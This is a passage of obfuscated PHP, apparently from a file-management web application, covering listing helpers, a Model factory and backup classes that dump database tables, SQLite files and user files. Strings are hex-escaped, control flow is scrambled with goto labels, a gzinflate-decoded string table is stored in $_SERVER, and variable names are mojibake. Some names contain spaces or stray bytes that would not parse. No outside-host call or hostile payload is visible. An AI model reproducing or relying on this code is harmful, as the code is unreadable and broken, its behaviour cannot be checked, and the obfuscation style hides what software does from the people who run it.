"\x53\x45\x4c\105\x43\124\40\x2a\40\x46\x52\x4f\x4d\x20\50\123\x45\114\105\103\x54\x20\x27{$fäå½®‹é¹}\137\143\150\x69\x6c\144\x27\40\141\x73\40\x68\x61\x73\40\106\x52\x4f\115\x20\x60{$a¦ÀÖÂÛŒ}\140\x20\x77\150\x65\x72\145\40\147\162\157\165\160\111\104\75{$fäå½®‹é¹}\40\154\x69\x6d\x69\x74\40\61\x29\40\141\163\40\x74\x62\x5f{$fäå½®‹é¹}\x20\x75\x6e\151\x6f\x6e\40\x61\154\x6c\x20"; if (($E’í…‰÷Ñ² >= 20 || $f‡›Ö×ãßò == $Dˆ³šˆˆö - 1) && $A½¾´ÁéŸ) { $A½¾´ÁéŸ = substr($A½¾´ÁéŸ, 0, -strlen($DÚ´ƒó†òÒ[445])); $c‘½˜ª‹™ = $this->query($A½¾´ÁéŸ); $Bˆ­«Æ…ù¾ = array_merge($Bˆ­«Æ…ù¾, $c‘½˜ª‹™); $E’í…‰÷Ñ² = 0; $A½¾´ÁéŸ = $DÚ´ƒó†òÒ[33]; } } goto Aè „Ş½†ƒ; aìÊŸ³ˆó¬: } private function _listAppendMeta(&$A¯ÔÆİ˜ºì, $C¥¸¿§”º) { $B‡æË…†á =& $_SERVER[÷ÖêïÔÔÓ]; $e¾ÂÓš¸ÚÄ = array($B‡æË…†á[2004] => array($B‡æË…†á[7], $C¥¸¿§”º)); $Eä‡ ”­ëë = Model($B‡æË…†á[2080])->where($e¾ÂÓš¸ÚÄ)->select(); $Eä‡ ”­ëë = array_to_keyvalue_group($Eä‡ ”­ëë, $B‡æË…†á[2004]); foreach ($Eä‡ ”­ëë as &$F¦Ö¬Óá›—) { $F¦Ö¬Óá›— = array_to_keyvalue($F¦Ö¬Óá›—, $B‡æË…†á[88], $B‡æË…†á[354]); } foreach ($A¯ÔÆİ˜ºì as &$aĞ™Òº¾Á) { $aĞ™Òº¾Á[$B‡æË…†á[413]] = array(); if (isset($Eä‡ ”­ëë[$aĞ™Òº¾Á[$B‡æË…†á[2004]]])) { $aĞ™Òº¾Á[$B‡æË…†á[413]] = $Eä‡ ”­ëë[$aĞ™Òº¾Á[$B‡æË…†á[2004]]]; } } } protected function parentLevelArray($Bõá°Ä¶ã) { $aÏÖ‘ª…ˆº =& $_SERVER[÷ÖêïÔÔÓ]; $Bõá°Ä¶ã = explode($aÏÖ‘ª…ˆº[47], trim($Bõá°Ä¶ã, $aÏÖ‘ª…ˆº[47])); $Bõá°Ä¶ã = array_remove_value($Bõá°Ä¶ã, $aÏÖ‘ª…ˆº[464]); return $Bõá°Ä¶ã; } private function _listAppendParent(&$FéÈæ²£“Ø) { goto A¶ßÒ­ô†; AŞç™õ›Ì¤: $E–¤¶†áì” = array(); foreach ($eîƒ‚Şİ·ğ as $AÊ‡Á•¥¾ï => $c×«Õøç¸ä) { if (!$c×«Õøç¸ä) { $E–¤¶†áì”[] = $AÊ‡Á•¥¾ï; } } if ($E–¤¶†áì”) { $aØ×¬‰­… = array($f½À¢ïî†[2079] => array($f½À¢ïî†[381], $E–¤¶†áì”)); $d®ôñšß = $this->field($f½À¢ïî†[2092])->where($aØ×¬‰­…)->select(); $e˜É©…ºë = array_to_keyvalue($d®ôñšß, $f½À¢ïî†[2004], $f½À¢ïî†[28]); $eîƒ‚Şİ·ğ = array_merge_index($eîƒ‚Şİ·ğ, $e˜É©…ºë); } goto EöÓÅÒ‚öÔ; A¶ßÒ­ô†: $f½À¢ïî† =& $_SERVER[÷ÖêïÔÔÓ]; $eîƒ‚Şİ·ğ = array(); foreach ($FéÈæ²£“Ø as &$dåâÖÄñô—) { $eîƒ‚Şİ·ğ[$dåâÖÄñô—[$f½À¢ïî†[2004]]] = $dåâÖÄñô—[$f½À¢ïî†[28]]; $d½¼°ÀÃ¹« = $this->parentLevelArray($dåâÖÄñô—[$f½À¢ïî†[455]]); foreach ($d½¼°ÀÃ¹« as $Dèé‹à·–ó) { if (!isset($eîƒ‚Şİ·ğ[$Dèé‹à·–ó])) { $eîƒ‚Şİ·ğ[$Dèé‹à·–ó] = 0; } } } goto AŞç™õ›Ì¤; EöÓÅÒ‚öÔ: foreach ($FéÈæ²£“Ø as &$dåâÖÄñô—) { $d½¼°ÀÃ¹« = $this->parentLevelArray($dåâÖÄñô—[$f½À¢ïî†[455]]); $Bí¬ò„Á» = $f½À¢ïî†[33]; foreach ($d½¼°ÀÃ¹« as $Dèé‹à·–ó) { $Bí¬ò„Á» .= $eîƒ‚Şİ·ğ[$Dèé‹à·–ó] . $f½À¢ïî†[8]; } if ($d½¼°ÀÃ¹«) { $Bí¬ò„Á» .= $dåâÖÄñô—[$f½À¢ïî†[28]]; } $dåâÖÄñô—[$f½À¢ïî†[459]] = str_replace($f½À¢ïî†[463], $f½À¢ïî†[8], $Bí¬ò„Á»); } goto D¥ë×‹ä; D¥ë×‹ä: } private function _listAppendSourceRoot(&$Cœ¡µìËÊ, $BĞº†ô§‚®) { goto dœÛ‹‘„©ò; BõÓŸÈíÜÁ: foreach ($Cœ¡µìËÊ as &$c‚¥‹Á›ç‰) { $c‚¥‹Á›ç‰[$Fàø­–Ï¤[388]] = $c‹Š°´ñ¾‚[$c‚¥‹Á›ç‰[$Fàø­–Ï¤[2004]]] ? $c‹Š°´ñ¾‚[$c‚¥‹Á›ç‰[$Fàø­–Ï¤[2004]]] : array(); } goto BœØœ©’µå; dœÛ‹‘„©ò: $Fàø­–Ï¤ =& $_SERVER[÷ÖêïÔÔÓ]; $d™ÚĞ§Ä¡ = array($Fàø­–Ï¤[368] => SourceModel::TYPE_GROUP, $Fàø­–Ï¤[457] => 0, $Fàø­–Ï¤[452] => array($Fàø­–Ï¤[7], $BĞº†ô§‚®)); $fÂã½ÃÂğ = $Fàø­–Ï¤[2093]; goto bšÌšÕäˆÄ; bšÌšÕäˆÄ: $c‹Š°´ñ¾‚ = Model($Fàø­–Ï¤[748])->order($Fàø­–Ï¤[2094])->field($fÂã½ÃÂğ)->where($d™ÚĞ§Ä¡)->select(); $c‹Š°´ñ¾‚ = array_to_keyvalue($c‹Š°´ñ¾‚, $Fàø­–Ï¤[452]); $c‹Š°´ñ¾‚ = array_remove_key($c‹Š°´ñ¾‚, $Fàø­–Ï¤[452]); goto BõÓŸÈíÜÁ; BœØœ©’µå: } protected function resetParentLevel() { $d°¨—³ª•Î =& $_SERVER[÷ÖêïÔÔÓ]; $FºØØÛ«İâ = $d°¨—³ª•Î[2004]; $c§Šº¬‘İ¦ = $this->select(); $c§Šº¬‘İ¦ = array_to_keyvalue($c§Šº¬‘İ¦, $FºØØÛ«İâ); foreach ($c§Šº¬‘İ¦ as $f™‘µ¢È) { goto aà®êØ¬Åà; aà®êØ¬Åà: $A¶‚‰±¬¥ğ = $f™‘µ¢È; $eŠÇ³ãê›“ = array(); while ($A¶‚‰±¬¥ğ[$d°¨—³ª•Î[457]] != 0) { $eŠÇ³ãê›“[] = $A¶‚‰±¬¥ğ[$d°¨—³ª•Î[457]]; $A¶‚‰±¬¥ğ = $c§Šº¬‘İ¦[$A¶‚‰±¬¥ğ[$d°¨—³ª•Î[457]]]; } goto Bê–İœ©ÙØ; EÚªŒØÊ»£: $this->where(array($FºØØÛ«İâ => $f™‘µ¢È[$FºØØÛ«İâ]))->save(array($d°¨—³ª•Î[518] => $eŠÇ³ãê›“)); goto cÄ®ã‡Êˆ; Bê–İœ©ÙØ: $eŠÇ³ãê›“[] = 0; $eŠÇ³ãê›“ = $d°¨—³ª•Î[47] . implode($d°¨—³ª•Î[47], array_reverse($eŠÇ³ãê›“)) . $d°¨—³ª•Î[47]; $this->setNamePinyin($f™‘µ¢È[$FºØØÛ«İâ], $f™‘µ¢È[$d°¨—³ª•Î[28]]); goto EÚªŒØÊ»£; cÄ®ã‡Êˆ: } return $c§Šº¬‘İ¦; } public function groupNameAuto($AãÍÍÏ‘¸, $aää‰†øß) { $A¬¨ÔÑã†Å =& $_SERVER[÷ÖêïÔÔÓ]; $f¶ÁëÙôò = $this->where(array($A¬¨ÔÑã†Å[365] => $AãÍÍÏ‘¸))->getField($A¬¨ÔÑã†Å[28], !0); if (!$f¶ÁëÙôò || !in_array($aää‰†øß, $f¶ÁëÙôò)) { return $aää‰†øß; } for ($fçÒÑ”ê°× = 1; $fçÒÑ”ê°× <= count($f¶ÁëÙôò) + 1; $fçÒÑ”ê°×++) { $B­‹ÈŠî² = $aää‰†øß . "\x28{$fçÒÑ”ê°×}\51"; if (!in_array($B­‹ÈŠî², $f¶ÁëÙôò)) { return $B­‹ÈŠî²; } } } } goto b öÏ¿’¸ö; B¤¯¦“øÍî: define($_SERVER[÷ÖêïÔÔÓ][0], $_SERVER[÷ÖêïÔÔÓ][1]); $_SERVER[Óº‹‘Î] = explode($_SERVER[÷ÖêïÔÔÓ][2], gzinflate(substr($_SERVER[÷ÖêïÔÔÓ][3], 10, -8))); function Model($DÕÇ¦ã³Ô‡ = '', $Eñ®º‰ßğæ = '', $fñ­«ÚŒ„Ç = '') { goto Dà»š×Ó¶ä; f·ÉÜ›Ï®: $aËÑîÉÔ¨Œ[$cÏ¯ñáéå] = new ModelBase($DÕÇ¦ã³Ô‡, $Eñ®º‰ßğæ, $fñ­«ÚŒ„Ç); return $aËÑîÉÔ¨Œ[$cÏ¯ñáéå]; goto cÌ†šÉÍ; dŒ“ÙØÑ¹: if (isset($aËÑîÉÔ¨Œ[$cÏ¯ñáéå])) { return $aËÑîÉÔ¨Œ[$cÏ¯ñáéå]; } if ($DÕÇ¦ã³Ô‡) { $DÕÇ¦ã³Ô‡ = strtoupper($DÕÇ¦ã³Ô‡[0]) . substr($DÕÇ¦ã³Ô‡, 1); $EÂ‡ïÉõ„¤ = $DÕÇ¦ã³Ô‡ . $bšƒÑ™„¥[1]; if (class_exists($EÂ‡ïÉõ„¤)) { $aËÑîÉÔ¨Œ[$cÏ¯ñáéå] = new $EÂ‡ïÉõ„¤(); return $aËÑîÉÔ¨Œ[$cÏ¯ñáéå]; } } if (!$fñ­«ÚŒ„Ç) { $fñ­«ÚŒ„Ç = $GLOBALS[$bšƒÑ™„¥[2]][$bšƒÑ™„¥[3]]; } goto f·ÉÜ›Ï®; Dà»š×Ó¶ä: $bšƒÑ™„¥ =& $_SERVER[Óº‹‘Î]; static $aËÑîÉÔ¨Œ = array(); $cÏ¯ñáéå = strtolower($Eñ®º‰ßğæ . $bšƒÑ™„¥[0] . $DÕÇ¦ã³Ô‡); goto dŒ“ÙØÑ¹; cÌ†šÉÍ: } goto cëµå©ª‘Á; A÷ß¥ª‹÷Ü: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto AçÍë•»Û; eÒ–¹¡İ¡Í: $E›ÔÔ¥Ğ½å = TEMP_FILES . $d äë°˜Åõ[704] . self::$name . $d äë°˜Åõ[8]; del_dir($E›ÔÔ¥Ğ½å); mk_dir($E›ÔÔ¥Ğ½å); goto E ê¢œâ¿Ê; E ê¢œâ¿Ê: foreach ($eÆ‹Ö­ƒÌå as $a„ä½ï»à…) { $b…ƒ¦ŠÖñ´ = "{$E›ÔÔ¥Ğ½å}{$a„ä½ï»à…}\x2e\x73\161\x6c"; $Aó‡ÏŒ«É += $this->makeSqlFile($a„ä½ï»à…, $b…ƒ¦ŠÖñ´, $AÁˆÑ«¢—“, $f©èÍŠçÅ); } $AÁˆÑ«¢—“->end(); $AØÑæ˜Êõæ = array($d äë°˜Åõ[693] => 1, $d äë°˜Åõ[705] => $Aó‡ÏŒ«É); goto dôŒ¸¼Ë–; aô­Ò—‰¿è: $eÆ‹Ö­ƒÌå = Model()->db()->getTables(); foreach ($eÆ‹Ö­ƒÌå as $a„ä½ï»à…) { $F’îª«©ô += Model($a„ä½ï»à…)->count(); } $AÁˆÑ«¢—“ = new Task($d äë°˜Åõ[696], $d äë°˜Åõ[697], $F’îª«©ô, LNG($d äë°˜Åõ[698]) . $d äë°˜Åõ[699] . LNG($d äë°˜Åõ[700])); goto Bğà¿ÄÁ¤Í; cš·´ŸŠ…: self::$name = $f©èÍŠçÅ[$d äë°˜Åõ[28]]; if ($A…½Ö°¨¾¬ = $this->sqliteFile()) { return $this->sqliteBackup($A…½Ö°¨¾¬); } $F’îª«©ô = 0; goto aô­Ò—‰¿è; AçÍë•»Û: $d äë°˜Åõ =& $_SERVER[÷ÖêïÔÔÓ]; $f©èÍŠçÅ = Backup::get(); self::$io = $f©èÍŠçÅ[$d äë°˜Åõ[677]]; goto cš·´ŸŠ…; dôŒ¸¼Ë–: Backup::set($AØÑæ˜Êõæ); return !0; goto cÚÛòš‚Êô; Bğà¿ÄÁ¤Í: $AØÑæ˜Êõæ = array($d äë°˜Åõ[701] => $d äë°˜Åõ[702], $d äë°˜Åõ[703] => $F’îª«©ô + 1); Backup::set($AØÑæ˜Êõæ); $Aó‡ÏŒ«É = 0; goto eÒ–¹¡İ¡Í; cÚÛòš‚Êô: } public function makeSqlFile($EÛÎàÆ•Õ, $fŒ–â…®Ô—, $C­×ùÁ¬¾Ñ, $D‹ĞÎòº¯) { goto aæ¸•îÏ¿ã; A÷ÒŞ¦Ü: $eö…àÁŒ­ = 2000; $AÛÚÔêÏ‹ã = fopen($fŒ–â…®Ô—, $_SERVER[÷ÖêïÔÔÓ][706]); $eï×á­×… = Model($EÛÎàÆ•Õ)->getPk(); goto eïôé¶íŞ×; Bš¸ÛÁÒäå: return $fÈ²ÆŠªÂ—; goto FÁ—İ³•“å; aæ¸•îÏ¿ã: $c†ÓŠˆ†Œ­ = self::$io; $fÈ²ÆŠªÂ— = 0; $fÖš¿Íõ®° = 1; goto A÷ÒŞ¦Ü; eïôé¶íŞ×: $BÜÙ‚Ò½£• = Model($EÛÎàÆ•Õ)->getDbFields(); do { $c±ºøñ¹ = Model($EÛÎàÆ•Õ)->field($BÜÙ‚Ò½£•)->order($eï×á­×… . $_SERVER[÷ÖêïÔÔÓ][707])->selectPage($eö…àÁŒ­, $fÖš¿Íõ®°); $fçŸÉª›¥™ = !empty($c±ºøñ¹[$_SERVER[÷ÖêïÔÔÓ][350]]) ? $c±ºøñ¹[$_SERVER[÷ÖêïÔÔÓ][350]] : array(); $C¿ùæÍÚš‘ = array(); foreach ($fçŸÉª›¥™ as $c½šì‚‰’) { if ($EÛÎàÆ•Õ == $_SERVER[÷ÖêïÔÔÓ][708] && (!isset($D‹ĞÎòº¯[$_SERVER[÷ÖêïÔÔÓ][678]]) || $D‹ĞÎòº¯[$_SERVER[÷ÖêïÔÔÓ][678]] == $_SERVER[÷ÖêïÔÔÓ][464])) { $c½šì‚‰’[$_SERVER[÷ÖêïÔÔÓ][76]] = "\173\151\x6f\x3a{$c†ÓŠˆ†Œ­}\175" . substr($c½šì‚‰’[$_SERVER[÷ÖêïÔÔÓ][76]], strlen("\x7b\x69\157\72{$c½šì‚‰’[$_SERVER[÷ÖêïÔÔÓ][709]]}\x7d")); $c½šì‚‰’[$_SERVER[÷ÖêïÔÔÓ][709]] = $c†ÓŠˆ†Œ­; } $C¿ùæÍÚš‘[] = $_SERVER[÷ÖêïÔÔÓ][710] . $this->addSqlSlashes($c½šì‚‰’) . $_SERVER[÷ÖêïÔÔÓ][711]; } if ($e¦ÂæîÎèÒ = count($fçŸÉª›¥™)) { $b•ê†ÒÇïè = "\x49\116\123\105\x52\x54\x20\x49\x4e\x54\x4f\40\x60{$EÛÎàÆ•Õ}\140\40\x28\x60" . implode($_SERVER[÷ÖêïÔÔÓ][712], $BÜÙ‚Ò½£•) . $_SERVER[÷ÖêïÔÔÓ][713]; fwrite($AÛÚÔêÏ‹ã, $b•ê†ÒÇïè . implode($_SERVER[÷ÖêïÔÔÓ][714], $C¿ùæÍÚš‘) . $_SERVER[÷ÖêïÔÔÓ][68] . PHP_EOL); $C­×ùÁ¬¾Ñ->update($e¦ÂæîÎèÒ); } $fÖš¿Íõ®°++; $fÈ²ÆŠªÂ— += $e¦ÂæîÎèÒ; } while ($e¦ÂæîÎèÒ == $eö…àÁŒ­); fclose($AÛÚÔêÏ‹ã); goto Bš¸ÛÁÒäå; FÁ—İ³•“å: } private function addSqlSlashes($C¦Ğã©½‚Ñ) { $F¾ÇÁƒ “İ =& $_SERVER[÷ÖêïÔÔÓ]; $B”Õµñö¡Ñ = array(); foreach ($C¦Ğã©½‚Ñ as $b„­¿êà°–) { if (is_array($b„­¿êà°–)) { $b„­¿êà°– = json_encode_force($b„­¿êà°–); } $b„­¿êà°– = addslashes($b„­¿êà°–); $b„­¿êà°– = str_replace(array($F¾ÇÁƒ “İ[715], $F¾ÇÁƒ “İ[214]), array($F¾ÇÁƒ “İ[716], $F¾ÇÁƒ “İ[717]), $b„­¿êà°–); $B”Õµñö¡Ñ[] = $b„­¿êà°–; } return $F¾ÇÁƒ “İ[55] . implode($F¾ÇÁƒ “İ[718], $B”Õµñö¡Ñ) . $F¾ÇÁƒ “İ[55]; } private function sqliteFile() { $DŸŠ”ÊÎ‹Õ =& $_SERVER[÷ÖêïÔÔÓ]; $fêÄˆªØŒÑ = null; $b‡Ö“ùˆ– = $GLOBALS[$DŸŠ”ÊÎ‹Õ[6]][$DŸŠ”ÊÎ‹Õ[17]]; if ($b‡Ö“ùˆ–[$DŸŠ”ÊÎ‹Õ[719]] == $DŸŠ”ÊÎ‹Õ[720]) { $dÂÉÛœ¢ô = explode($DŸŠ”ÊÎ‹Õ[721], $b‡Ö“ùˆ–[$DŸŠ”ÊÎ‹Õ[722]]); if (substr($dÂÉÛœ¢ô[0], 0, 6) == $DŸŠ”ÊÎ‹Õ[9]) { $fêÄˆªØŒÑ = $dÂÉÛœ¢ô[1]; } } else { if (substr($b‡Ö“ùˆ–[$DŸŠ”ÊÎ‹Õ[719]], 0, 6) == $DŸŠ”ÊÎ‹Õ[9]) { $fêÄˆªØŒÑ = $b‡Ö“ùˆ–[$DŸŠ”ÊÎ‹Õ[231]]; } } return $fêÄˆªØŒÑ; } public function sqliteBackup($B‹×ŠÍ™Ôó) { goto b©Ë…Å‹Å…; F¥Æ×ÚŒ‰½: $F‡¼ŞæÊ‹Ç = "\x7b\151\157\72{$dêŠ‰ˆğæ‹}\x7d\57\x64\x61\x74\141\142\x61\x73\145\57\x62\x61\x63\x6b\165\x70\137" . self::$name . $eßç›ö«¡Æ[724]; if (!IO::exist($F‡¼ŞæÊ‹Ç)) { IO::mkdir($F‡¼ŞæÊ‹Ç); } $AˆõÈÃ• = IO::size($B‹×ŠÍ™Ôó); goto eÙ¼Å“Ÿ…; b©Ë…Å‹Å…: $eßç›ö«¡Æ =& $_SERVER[÷ÖêïÔÔÓ]; $dêŠ‰ˆğæ‹ = self::$io; $aç‘¨¿ØÈ‘ = CONTROLLER_DIR . $eßç›ö«¡Æ[723]; goto F¥Æ×ÚŒ‰½; eÙ¼Å“Ÿ…: $bÅµé´âßò = array($eßç›ö«¡Æ[701] => $eßç›ö«¡Æ[9], $eßç›ö«¡Æ[703] => 1, $eßç›ö«¡Æ[725] => $AˆõÈÃ•); Backup::set($bÅµé´âßò); $EÄÂ¨ÊÃ£  = new TaskFileTransfer($eßç›ö«¡Æ[726], $eßç›ö«¡Æ[697], 1, LNG($eßç›ö«¡Æ[698]) . $eßç›ö«¡Æ[408] . LNG($eßç›ö«¡Æ[700]) . $eßç›ö«¡Æ[727]); goto ešà‚Å×§Ş; ešà‚Å×§Ş: $EÄÂ¨ÊÃ£ ->task[$eßç›ö«¡Æ[684]] = $AˆõÈÃ•; IO::copy($aç‘¨¿ØÈ‘ . $eßç›ö«¡Æ[728], $F‡¼ŞæÊ‹Ç); IO::copy($B‹×ŠÍ™Ôó, $F‡¼ŞæÊ‹Ç); goto eÂ¾´ ¶”›; eÂ¾´ ¶”›: $EÄÂ¨ÊÃ£ ->end(); $bÅµé´âßò = array($eßç›ö«¡Æ[693] => 1, $eßç›ö«¡Æ[705] => 1, $eßç›ö«¡Æ[694] => 1, $eßç›ö«¡Æ[729] => $AˆõÈÃ•); Backup::set($bÅµé´âßò); goto a¹ææŸ„¨Õ; a¹ææŸ„¨Õ: return !1; goto CÃö˜£¥ˆ; CÃö˜£¥ˆ: } } class BackupDbFile { public function __construct() { } public function index() { goto CÃ¾Šæ§ÌŸ; AàóÊœÀ¡: return !0; goto DÂÁ ŞÇïÜ; d…ÓÇ•ë‚: IO::copy($d·Œ¼ºÍº, $c¿ÍÇ…ïêğ . "\142\141\143\x6b\165\x70\137{$F‚À³óÉôë}\57"); $fÒ¨ÌÏ×™˜->end(); Backup::set(array($a¤â¤ãÉ„Ä[729] => $F›·¿¥òã[$a¤â¤ãÉ„Ä[78]])); goto AàóÊœÀ¡; bÎ–æ°¹—Ò: Backup::set(array($a¤â¤ãÉ„Ä[725] => $F›·¿¥òã[$a¤â¤ãÉ„Ä[78]])); IO::move($CÜ…ø÷ò¤†, $c¿ÍÇ…ïêğ); $d·Œ¼ºÍº = CONTROLLER_DIR . $a¤â¤ãÉ„Ä[730]; goto d…ÓÇ•ë‚; Bµä…ÈƒÜ: $fÒ¨ÌÏ×™˜ = new TaskFileTransfer($a¤â¤ãÉ„Ä[726], $a¤â¤ãÉ„Ä[697], 0, LNG($a¤â¤ãÉ„Ä[698]) . $a¤â¤ãÉ„Ä[408] . LNG($a¤â¤ãÉ„Ä[700]) . $a¤â¤ãÉ„Ä[727]); $fÒ¨ÌÏ×™˜->addPath($CÜ…ø÷ò¤†); $F›·¿¥òã = IO::infoWithChildren($CÜ…ø÷ò¤†); goto bÎ–æ°¹—Ò; CÃ¾Šæ§ÌŸ: $a¤â¤ãÉ„Ä =& $_SERVER[÷ÖêïÔÔÓ]; $e­Ñ†ÙÒ‰¨ = Backup::get(); $F‚À³óÉôë = $e­Ñ†ÙÒ‰¨[$a¤â¤ãÉ„Ä[28]]; goto D¶¼Äì½; D¶¼Äì½: $CÜ…ø÷ò¤† = TEMP_FILES . "\x62\x61\x63\153\x75\160\137{$F‚À³óÉôë}\57"; $c¿ÍÇ…ïêğ = "\x7b\151\157\x3a{$e­Ñ†ÙÒ‰¨[$a¤â¤ãÉ„Ä[677]]}\x7d\57\x64\x61\x74\x61\x62\141\163\x65\x2f"; IO::mkdir($c¿ÍÇ…ïêğ . "\142\x61\143\153\165\160\137{$F‚À³óÉôë}\x2f"); goto Bµä…ÈƒÜ; DÂÁ ŞÇïÜ: } } class BackupFile { public function __construct() { } public function index() { goto F™Åã—İó©; F™Åã—İó©: $C•ÂŞ˜­¤ = Backup::get(); $Aôºä¶á•É = $C•ÂŞ˜­¤[$_SERVER[÷ÖêïÔÔÓ][278]][$_SERVER[÷ÖêïÔÔÓ][164]][$_SERVER[÷ÖêïÔÔÓ][415]]; $CêÀä£á˜Õ = array($_SERVER[÷ÖêïÔÔÓ][416] => array($_SERVER[÷ÖêïÔÔÓ][731], $Aôºä¶á•É), $_SERVER[÷ÖêïÔÔÓ][732] => array($_SERVER[÷ÖêïÔÔÓ][316], $C•ÂŞ˜­¤[$_SERVER[÷ÖêïÔÔÓ][677]])); goto bÁÖŸŠÙ™ä; cªÏ²•‹ÕŸ: $Fì¿ÓÛÔ”É = array(); $EÒÌÂöîÇ = $Aá™î¨¤Õµ = 0; do { $b³“ƒêİŠ = $_SERVER[÷ÖêïÔÔÓ][737]; $DÛÍÊÊÏÛ = Model($_SERVER[÷ÖêïÔÔÓ][708])->where($CêÀä£á˜Õ)->field($b³“ƒêİŠ)->order($_SERVER[÷ÖêïÔÔÓ][738])->selectPage($Dµ˜óŞÑì™, $D¾ÔîËÛ½ò); $F†ÑÔ«Œñ“ = !empty($DÛÍÊÊÏÛ[$_SERVER[÷ÖêïÔÔÓ][350]]) ? $DÛÍÊÊÏÛ[$_SERVER[÷ÖêïÔÔÓ][350]] : array(); foreach ($F†ÑÔ«Œñ“ as $e¿–„²‰ÌŸ) { goto Cô™ƒÑÊ¾; Fï²ŞÈæ: if ($E‚²ŒÛÖëÃ >= 1024 * 1024 * 50) { $e»æ†•–ó = array($_SERVER[÷ÖêïÔÔÓ][743] => $Aôºä¶á•É, $_SERVER[÷ÖêïÔÔÓ][744] => $Aá™î¨¤Õµ, $_SERVER[÷ÖêïÔÔÓ][745] => $EÒÌÂöîÇ); Backup::set($e»æ†•–ó); $E‚²ŒÛÖëÃ = $EÕ×òŒÃğ = 0; } goto FğõÜ‚èÆ; dºĞö‰öÇœ: $E‚²ŒÛÖëÃ += $e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][78]]; $Aá™î¨¤Õµ += 1; $EÒÌÂöîÇ += $e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][78]]; goto Fï²ŞÈæ; FØ§…¸áîƒ: if (IO::exist($dÙ¸ÜÈå)) { $bÙ…êã¬ªš->updateFileEnd($e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][28]], $e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][78]]); } else { $dÙ¸ÜÈå = get_path_father($dÙ¸ÜÈå); $B«ß“§Ã¤ = IO::mkdir($dÙ¸ÜÈå); if (!$B«ß“§Ã¤ || !IO::copy($bİ¨ÆìÉ¥, $dÙ¸ÜÈå, $_SERVER[÷ÖêïÔÔÓ][740])) { write_log($_SERVER[÷ÖêïÔÔÓ][741] . $bİ¨ÆìÉ¥ . $_SERVER[÷ÖêïÔÔÓ][742] . $dÙ¸ÜÈå . $_SERVER[÷ÖêïÔÔÓ][468], $_SERVER[÷ÖêïÔÔÓ][697]); continue; } } $Aôºä¶á•É = $e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][415]]; $EÕ×òŒÃğ += 1; goto dºĞö‰öÇœ; Cô™ƒÑÊ¾: if (!$this->_fileExist($e¿–„²‰ÌŸ, $Fì¿ÓÛÔ”É)) { $d°õ‘áäï¿ -= 1; $cÅˆ±­³Ò“ -= (int) $e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][78]]; write_log("\x66\151\154\145\40\156\x6f\x74\40\145\x78\x69\x73\x74\56\x66\x69\154\145\111\104\x3a{$e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][415]]}\x2c\x20\160\141\x74\x68\x3a{$e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][76]]}", $_SERVER[÷ÖêïÔÔÓ][739]); continue; } $bİ¨ÆìÉ¥ = $e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][76]]; $dÙ¸ÜÈå = "\173\x69\x6f\x3a{$C•ÂŞ˜­¤[$_SERVER[÷ÖêïÔÔÓ][677]]}\x7d" . substr($bİ¨ÆìÉ¥, strlen("\x7b\x69\x6f\72{$e¿–„²‰ÌŸ[$_SERVER[÷ÖêïÔÔÓ][709]]}\175")); goto FØ§…¸áîƒ; FğõÜ‚èÆ: } $Cõ–î§¾Ÿñ = count($F†ÑÔ«Œñ“); $D¾ÔîËÛ½ò++; } while ($Cõ–î§¾Ÿñ == $Dµ˜óŞÑì™); goto aÕ¥”ˆ›…Š; b† Ü®‘‘Ù: $D¾ÔîËÛ½ò = 1; $Dµ˜óŞÑì™ = 1000; $E‚²ŒÛÖëÃ = $EÕ×òŒÃğ = 0; goto cªÏ²•‹ÕŸ; A­¼†ˆÚÉ—: Backup::set($e»æ†•–ó); $this->_fileFilter($Fì¿ÓÛÔ”É); return !0; goto CËã‹½Êçë; EÂ”Û‰¡óù: $bÙ…êã¬ªš->task[$_SERVER[÷ÖêïÔÔÓ][684]] = $cÅˆ±­³Ò“; $e»æ†•–ó = array($_SERVER[÷ÖêïÔÔÓ][735] => $d°õ‘áäï¿, $_SERVER[÷ÖêïÔÔÓ][736] => $cÅˆ±­³Ò“); Backup::set($e»æ†•–ó); goto b† Ü®‘‘Ù; aÕ¥”ˆ›…Š: $bÙ…êã¬ªš->end(); $e»æ†•–ó = array($_SERVER[÷ÖêïÔÔÓ][746] => 1, $_SERVER[÷ÖêïÔÔÓ][689] => time(), $_SERVER[÷ÖêïÔÔÓ][695] => 1, $_SERVER[÷ÖêïÔÔÓ][743] => $Aôºä¶á•É, $_SERVER[÷ÖêïÔÔÓ][736] => $cÅˆ±­³Ò“, $_SERVER[÷ÖêïÔÔÓ][735] => $d°õ‘áäï¿); if ($EÕ×òŒÃğ) { $e»æ†•–ó[$_SERVER[÷ÖêïÔÔÓ][744]] = $Aá™î¨¤Õµ; $e»æ†•–ó[$_SERVER[÷ÖêïÔÔÓ][745]] = $EÒÌÂöîÇ; } goto A­¼†ˆÚÉ—; bÁÖŸŠÙ™ä: $d°õ‘áäï¿ = (int) Model($_SERVER[÷ÖêïÔÔÓ][708])->where($CêÀä£á˜Õ)->count($_SERVER[÷ÖêïÔÔÓ][415]); $cÅˆ±­³Ò“ = (int) Model($_SERVER[÷ÖêïÔÔÓ][708])->where($CêÀä£á˜Õ)->sum($_SERVER[÷ÖêïÔÔÓ][78]); $bÙ…êã¬ªš = new TaskFileTransfer($_SERVER[÷ÖêïÔÔÓ][733], $_SERVER[÷ÖêïÔÔÓ][697], $d°õ‘áäï¿, LNG($_SERVER[÷ÖêïÔÔÓ][698]) . $_SERVER[÷ÖêïÔÔÓ][699] . LNG($_SERVER[÷ÖêïÔÔÓ][734])); goto EÂ”Û‰¡óù; CËã‹½Êçë: } private function _fileExist($d¯“ô¢Å‰, &$dáåÔ—ô‚£) { goto E°ÓŒ¥¿; E°ÓŒ¥¿: $f¾©Ç•Ú…¿ =& $_SERVER[÷ÖêïÔÔÓ]; $E¦Ğ§¿šÔœ = $d¯“ô¢Å‰[$f¾©Ç•Ú…¿[76]]; if (in_array($d¯“ô¢Å‰[$f¾©Ç•Ú…¿[415]], $dáåÔ—ô‚£)) { return !1; } goto eêœĞØƒÙë; 